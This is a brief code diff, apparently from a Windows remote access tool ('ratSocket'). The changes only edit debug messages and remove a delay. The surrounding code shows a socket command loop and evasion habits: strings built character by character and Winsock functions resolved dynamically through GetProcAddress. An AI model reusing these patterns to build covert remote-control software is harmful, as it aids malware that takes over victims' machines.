@@ -141,7 +141,7 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA("Error receiving message.");
 		}
 		
-		OutputDebugStringA("Received: ");
+		OutputDebugStringA("Received command: ");
 		char ca_info[] = { 'i','n','f','o',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
@@ -192,8 +192,7 @@ WinMain(HINSTANCE hInstance,
 		Sleep(3000);
 	}
 
-	OutputDebugStringA("Exiting...");	
-	Sleep(10000);
+	OutputDebugStringA("Shutting down...");	
 	
 	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
 	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
